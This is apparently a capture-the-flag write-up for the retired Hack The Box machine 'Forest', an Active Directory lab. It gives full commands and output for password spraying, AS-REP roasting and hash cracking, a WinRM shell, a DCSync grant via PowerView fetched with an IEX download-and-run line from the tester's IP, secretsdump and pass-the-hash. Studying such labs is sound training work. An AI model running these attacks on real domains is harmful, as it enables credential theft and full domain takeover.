# Forest

This is the write-up for the box Forest that got retired at the 21st March 2020.
My IP address was 10.10.14.3 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.161    forest.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/forest.nmap 10.10.10.161
```

```
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-02-13 12:44:35Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Full TCP port scan:
```
nmap -p- -o nmap/forest_allports.nmap 10.10.10.161
```
```
PORT      STATE SERVICE
(...)
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
```

According to the open ports, this box looks like an **Active Directory** domain controller.

## Checking SMB (Port 445)

Enumerating the SMB shares with **smbclient**:
```
smbclient -L 10.10.10.161
```
```
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
```

Unfortunately it found nothing.

## Checking DNS (Port 53)

Trying to get the hostname with DNS queries:
```
nslookup
```
```
Default server: 10.10.10.161
Address: 10.10.10.161#53

127.0.0.1
  1.0.0.127.in-addr.arpa  name = localhost.
10.10.10.161
  ** server can't find 161.10.10.10.in-addr.arpa: SERVFAIL
```

It did not display its own hostname.

## Checking RPC (Port 135 & 139)

Trying **SMB Null Authentication** to access the RPC service:
```
rpcclient -U '' 10.10.10.161
```

It works and information from RPC can be enumerated like user names:
```
rpcclient $> enumdomusers
```

It is possible to get most of the information with RPC, but I will use **LDAP** instead.

## Checking LDAP (Port 389)

Enumerating information from LDAP via **ldapsearch**:
```
ldapsearch -h 10.10.10.161 -x -s base namingcontexts
```
```
dn: namingContexts: DC=htb,DC=local
```

Searching through the _Base DN_:
```
ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local"
```

It has a lot of information, but queries will help to search for specific information.

Object class with attribute _person_:
```
ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=person)'
```

Filter for _sAMAccountName_ and put them in a file:
```
ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=person)' sAMAccountName | grep sAMAccountName | awk '{print $2}' > forest_userlist.ldap
```

There are some user names that are either computer accounts or accounts automatically created by **Exchange** that can be removed from the list.
That leaves us with five user names:
```
sebastien
lucinda
andy
mark
santi
```

## Password Spraying

This list of users can now be used for **Password Spraying**, but for this kind of **Brute-Force**, a small number of passwords is used to not lock the accounts out.
So we need to create a custom password list with easy-to-guess passwords that users often use:
```
January
February
March
April
May
June
July
August
September
October
November
December
Summer
Winter
Autumn
Fall
Spring
Password
Secret
Forest
htb
```

Putting a year at the end of every string:
```
for i in $(cat forest_passwords.list); do echo $i; echo ${i}2019; echo ${i}2020; done > pwlist_with_year.list
```

Putting an exclamation point at the end of every string in _pwlist_with_year.list_:
```
for i in $(cat pwlist_with_year.list); do echo $i; echo ${i}\!; done > pwlist_v2.list
```

This list can now be _mutated_ to use special variants of the passwords:
```
hashcat --force --stdout pwlist_v2.list -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule > pwlist_mutated_v1.list
```

The mutated list has almost 150.000 passwords, so filtering out the unique ones and every string that has more than 7 characters:
```
cat pwlist_mutated_v1.list | sort -u | awk 'length($0) > 7' > pwlist_v3.list
```

Now it has almost 40.000 passwords which is still a lot, but the chances are high that a valid password is in there.

The **Password Spraying** will be attempted with **CrackMapExec**.
As **SMB Null Authentication** works as the RPC service showed, it is possible to get the password policy:
```
crackmapexec smb 10.10.10.161 --pass-pol -u '' -p ''
```
```
Minimum password length: 7
Password history length: 24
Maximum password age: 41 days 23 hours 53 minutes
Minimum password age: 1 day 4 minutes
Reset Account Lockout Counter: 30 minutes
Locked Account Duration: 30 minutes
Account Lockout Threshold: None
Forced Log off Time: Not Set
```

There is no _Lockout Threshold_ so Brute-Forcing will not lock out any accounts.

Starting the Password Spray:
```
crackmapexec smb 10.10.10.161 -u forest_userlist.ldap -p pwlist_v3.list
```

Unfortunately none of the passwords are valid for any of the users.

## AS-REP Roasting

We can try to attempt different Active Directory attacks with the **Impacket scripts**.
The script _Get-NPNUsers_ queries the target domain for users with _"Do not require Kerberos preauthentication"_ set and export their TGTs for cracking.
This attack is called **AS-REP Roasting**.
```
impacket-GetNPUsers -dc-ip 10.10.10.161 -request 'htb.local/'
```

It is successful and outputs the **AS-REP hash information** of the service user _svc-alfresco_;
```
Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2021-02-13 16:15:40.427629  2019-09-23 13:09:47.931194  0x410200
```
```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:790b8f3c728fcfae85b1965944f957d9$713406134831aaf8bbdfb56a8e98b8731552d1ce0c5a3a78a80ff97d9711876bb3504d91b53ea0a5d09c506b2d606d8f4201c40a9d84ff581a9baebed94ab5777ced3e2990099aae726a8845af03e71313952c80e5fc3d74758c855f147a899deb453b04e8aa5ce3e30d3f12afb35795b8bfe8e351fbbfc3b68c1bc5f9b7d8af78d3373a44cf073073778d9098ad23344c1296e1414d2bd4c3f290937169f01d6fc2ba652b24f91354143313a1b5dbd4b2626649bb04be10381ad7cae19b80ef6b5968b631b562617a644fd02c14e49e1f26e3c2f1de6164bd6523f73c763262fa958b30711f
```

Cracking the hash with **Hashcat**:
```
hashcat -m 18200 svc-alfresco.hash /usr/share/wordlists/rockyou.txt
```

After a while it gets cracked and the password is:
> s3rvice

On port 5985 **WinRM** is open, which means that a shell sessions can be started with _svc-alfresco_ with [Evil-WinRM](https://github.com/Hackplayers/evil-winrm):
```
evil-winrm.rb -u svc-alfresco -p s3rvice -i 10.10.10.161
```

## Privilege Escalation

A SMB share can be mounted to transfer files between our local client and the box.

Creating an SMB share on local box:
```
impacket-smbserver share $(pwd) -smb2support -user User -password TestPass321
```

Mounting the share on the box and accessing it:
```
$pass = ConvertTo-SecureString 'TestPass321' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('User',$pass)
New-PSDrive -name share -PSProvider FileSystem -Credential $cred -Root \\10.10.14.3\share

cd share:
```

As this is a domain controller, attack paths for **Active Directory** can be gathered with **BloodHound**.
The ingestor **SharpHound.exe** has to be run first to get information about all domain objects:
```
.\SharpHound.exe
```

After it finished, it creates a ZIP-file that can be dragged into **BloodHound** for analysis.
The pre-built query _"Shortest Paths to Domain Admins from Owned Principals"_ shows a path from _svc-alfresco_ to the _Domain Administrators_ group:

![svc-alfresco to Domain Admins](https://kyuu-ji.github.io/htb-write-up/forest/forest_bh-1.png)

The user is in the _Account Operators_ group and the [documentation about AD Security Groups](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups) explains what kind of permissions users in this group have:
```
The Account Operators group grants limited account creation privileges to a user.
Members of this group can create and modify most types of accounts, including those of users, local groups, and global groups, and members can log in locally to domain controllers.
```

So lets create a new user a put it into the _Exchange Windows Permissions_ group:
```
net user NewUser Pass1234 /add /domain

net group "Exchange Windows Permissions" /add NewUser
```

The next is to abuse the _WriteDacl_ permissions via a **DCSync attack** and get full access to the domain.
This can be done with the **PowerSploit** tool **PowerView** and the _Add-DomainObjectAcl_ function:
```
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/PowerView.ps1')

$pass = ConvertTo-SecureString 'Pass1234' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('HTB\NewUser',$pass)

Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity NewUser -Rights DCSync
```

Our new user has now privileges to do a DCSync and _impacket-secretsdump_ command will dump all NTLM hashes from the box remotely:
```
impacket-secretsdump htb.local/NewUser:Pass1234@10.10.10.161
```
```
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
(...)
```

With a **Pass-the-Hash** attack, the hash of _Administrator_ can be used to login into the box via **PSexec**:
```
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 Administrator@10.10.10.161
```

It works and access is granted on the box as _NT Authority\SYSTEM_!
